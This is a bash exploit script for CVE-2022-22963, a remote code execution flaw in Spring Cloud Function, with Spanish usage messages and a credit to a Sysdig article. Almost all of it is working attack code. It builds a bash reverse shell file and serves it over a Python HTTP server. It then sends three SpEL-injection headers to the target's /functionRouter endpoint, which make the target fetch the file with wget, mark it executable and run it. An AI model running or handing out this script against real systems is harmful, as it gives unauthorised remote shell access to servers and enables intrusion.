# Exploit Title: SpringCloud
# Exploit Author: Jorge Reyes
# Date: 7 July 2023
# CVE : CVE-2022-22963
# Creditos al autor del articulo de https://sysdig.com/blog/cve-2022-22963-spring-cloud/
url=$1
lhost=$2
lport=$3
if [ $# -ne 3 ]; then
	echo "Uso: ./springCloud.sh url lhost lport"
	echo "Ejemplo: ./springCloud.sh http://192.168.100.8:8080 192.168.100.3 4444"
	exit 1
else
	echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> rs.sh
	python3 -m http.server 80 > /dev/null 2>&1 &
	pid_servidor=$!
	curl -X POST ${url}/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget -P /tmp http://'$lhost'/rs.sh")' --data-raw 'data' > /dev/null 2>&1
	curl -X POST ${url}/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/rs.sh")' --data-raw 'data' > /dev/null 2>&1
	curl -X POST ${url}/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rs.sh")' --data-raw 'data' > /dev/null 2>&1
	pkill -P $pid_servidor
	rm rs.sh
fi
